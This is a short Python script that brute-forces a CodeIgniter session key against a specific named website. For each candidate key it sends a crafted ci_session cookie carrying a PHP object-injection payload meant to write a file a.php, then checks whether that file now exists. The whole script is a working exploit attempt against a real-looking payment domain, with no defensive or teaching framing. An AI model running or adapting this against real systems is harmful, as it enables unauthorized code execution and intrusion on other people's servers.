import requests
import hashlib

f=open("keys.txt","r")


b='O:16:"Customcacheclass":2:{s:3:"dir";s:32:"a.php";s:5:"value";s:35:"<?php phpinfo();?>";}'

for i  in  f.readlines():
    try:
        i=i.replace("\n","")
        private_key = i
        cookies=str(b)+str(private_key)
        m=hashlib.md5(cookies.encode())
        cookies=str(m.hexdigest())
        headers={"User_Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36","Cookie" : "ci_session= "+cookies}
        requests.get("https://max.maxpay888.com",headers=headers)
        r=requests.get("https://max.maxpay888.com/a.php")
        if("404" not in r.content):
            print("key= "+str(i)+"  cookie= "+str(cookies))
            break
        else:
            print(i+"is not ture key cookie is "+str(cookies))
    except:
        print("error")

